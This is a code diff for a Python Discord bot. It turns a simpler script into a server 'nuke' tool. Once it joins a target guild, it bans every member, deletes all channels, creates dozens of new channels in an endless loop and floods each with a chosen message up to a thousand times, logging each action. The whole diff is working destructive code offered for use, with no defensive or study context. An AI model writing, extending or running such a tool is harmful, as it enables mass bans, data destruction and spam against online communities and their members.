@@ -1,50 +1,107 @@
-import threading, traceback, datetime, discord, asyncio, time
+import threading, traceback, datetime, discord, asyncio, ctypes, time
 
 logs = {}
 stops = []
 
 intents = discord.Intents.all()
 class DiscordBot(discord.Client):
-    def __init__(self, token:str):
+    def __init__(self, logId:str, token:str, guildId:int, channelName:str, latency:int, message:str, allUserBan:bool, allChannelDelete:bool):
         super().__init__(intents=intents)
+        self.logId = logId
         self.token = token
-    async def allChannelDelete(self, guildId:str):
+        self.guildId = guildId
+        self.channelName = channelName
+        self.nukeLatency = latency
+        self.message = message
+        self.allUserBan = allUserBan
+        self.allChannelDelete = allChannelDelete
+        
+        self.channels = None
+    async def banUser(self, user:discord.Member):
         try:
-            for guild in self.guilds:
-                if guild.id == guildId:
-                    break
-            await asyncio.gather(*(channel.delete() for channel in guild.channels))
+            await user.ban(reason="Fuck Server User")
+            logs[self.logId] += "[+]Success"
         except:
-            print(traceback.format_exc())
-    async def nuke(self, logId:str, latency:int, message:str, guildId:str, channelName:str, numberOfExecutions=1000):
+            logs[self.logId] += "-- Error --\n"+traceback.format_exc()+"\n"
+            logs[self.logId] += "[-]Failed"
+        logs[self.logId] += f" | {str(datetime.datetime.now())} BanUser ID:{user.id} Name:{user.name}\n"
+    async def deleteChannel(self, channel:discord.abc.GuildChannel):
         try:
-            logs[logId] = ""
-            for guild in self.guilds:
-                if guild.id == guildId:
-                    break
-            await asyncio.gather(*(guild.create_text_channel(channelName) for i in range(13)))
-            channels = list(guild.channels)
-            for i in range(numberOfExecutions):
-                if logId in stops:
-                    logs.pop(logId)
+            await channel.delete()
+            logs[self.logId] += "[+]Success"
+        except:
+            logs[self.logId] += "-- Error --\n"+traceback.format_exc()+"\n"
+            logs[self.logId] += "[-]Failed"
+        logs[self.logId] += f" | {str(datetime.datetime.now())} DeleteChannel ID:{channel.id} Name:{channel.name}\n"
+    async def sendMessage(self, message:str, channel:discord.TextChannel, latencyMs:float):
+        try:
+            await channel.send(message)
+            logs[self.logId] += "[+]Success"
+        except:
+            logs[self.logId] += "-- Error --\n"+traceback.format_exc()+"\n"
+            logs[self.logId] += "[-]Failed"
+        logs[self.logId] += f" | {str(datetime.datetime.now())} SendMessage ID:{channel.id}\n"
+        await asyncio.sleep(latencyMs)
+    async def banAllUser(self, guild:discord.Guild):
+        logs[self.logId] += "---- Start AllUserBan ----\n"
+        async for member in guild.fetch_members():
+            await self.banUser(member)
+        logs[self.logId] += "---- End ----\n\n\n"
+    async def deleteAllChannel(self, guild:discord.Guild):
+        logs[self.logId] += "---- Start AllChannelDelete ----\n"
+        await asyncio.gather(*(self.deleteChannel(channel) for channel in guild.channels))
+        logs[self.logId] += "---- End ----\n\n\n"
+    async def channelMaker(self, channelName:str, guild:discord.Guild):
+        while True:
+            try:
+                if self.logId in stops:
+                    logs.pop(self.logId)
+                    await self.close()
                     return
-                logs[logId] += f"{str(datetime.datetime.now())} Send BotNuke - "
+            except:
+                return
+            try:
                 channel = await guild.create_text_channel(channelName)
-                channels.append(channel)
-                try:
-                    await asyncio.gather(*(channel.send(message) for channel in channels))
-                    logs[logId] += "Success"
-                except:
-                    print(traceback.format_exc())
-                    logs[logId] += f"Failed"
-                logs[logId] += "\n"
-                await asyncio.sleep(latency*0.001)
+                self.channels.append(channel)
+            except:
+                pass
+    async def nuke(self, latency:int, message:str, guild:discord.Guild, channelName:str, numberOfExecutions=1000):
+        logs[self.logId] += "---- Start Nuke ----\n"
+        try:
+            await asyncio.gather(*(guild.create_text_channel(channelName) for i in range(30)))
+            self.channels = list(guild.channels)
+            asyncio.ensure_future(self.channelMaker(channelName, guild))
+            for _ in range(numberOfExecutions):
+                if self.logId in stops:
+                    logs.pop(self.logId)
+                    await self.close()
+                    return
+                logs[self.logId] += "--- Nuke ---\n"
+                await asyncio.gather(*(self.sendMessage(message, channel, latency*0.001) for channel in self.channels))
         except:
-            print(traceback.format_exc())
+            logs[self.logId] += "-- Error --\n"+traceback.format_exc()+"\n"
+        logs[self.logId] += "---- End ----\n"
+        stops.append(self.logId)
+        await self.close()
     async def on_ready(self):
-        pass
+        guild = None
+        for guild in self.guilds:
+            if guild.id == self.guildId:
+                break
+        if not guild:
+            logs[self.logId] += "Error: The server you entered has not been joined by a bot."
+            await self.close()
+            return
+        if self.allUserBan:
+            await self.banAllUser(guild)
+        if self.allChannelDelete:
+            await self.deleteAllChannel(guild)
+        await self.nuke(self.nukeLatency, self.message, guild, self.channelName)
     async def on_message(self, message):
         if message.author.bot:
             return
     def runBot(self):
-        self.run(self.token)
+        try:
+            self.run(self.token, reconnect=True)
+        except:
+            logs[self.logId] += f"Error:\n{traceback.format_exc()}"
